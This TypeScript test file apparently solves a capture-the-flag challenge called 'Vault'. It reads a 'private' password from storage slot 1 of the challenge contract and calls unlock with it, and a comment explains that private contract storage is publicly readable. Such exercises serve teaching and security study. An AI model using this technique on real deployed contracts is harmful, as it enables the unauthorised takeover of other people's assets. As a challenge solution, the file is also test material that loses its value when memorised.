import { expect } from "chai";
import { Contract, ContractTransaction, Signer } from "ethers";
import { HexString } from "../typings/global";
import { setupTest } from "./utils";

/**
 * The password is stored in the contract storage with `private` visibility modifier.
 * The `private` only means that other contract cannot read it, but we can because everything in the blockchain is public
 *
 * Storage slots:
 * @see: https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
 */

let eoa: Signer;
let challenge: Contract; // challenge contract

// Setup challenge level instance, eoa, attacker and before/after hooks
(async () => {
  const contractLevel = "0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670";
  const contractName = "Vault";
  ({ eoa, challenge } = await setupTest(contractLevel, { contractName }));
})();

it("solves the challenge", async () => {
  // grab data from storage - slot 0 is locked, slot 1 is the password
  const data = await eoa.provider?.getStorageAt(challenge.address, 1);
  if (data) {
    console.log(`password: ${hexToString(data)}`);
    const tx: ContractTransaction = await challenge.unlock(data);
    await tx.wait();
  }
  expect(await challenge.locked()).to.equal(false);
});

function hexToString(hexString: HexString) {
  const noPrefixHex = hexString.slice(2);
  return Buffer.from(noPrefixHex, "hex").toString("utf-8");
}
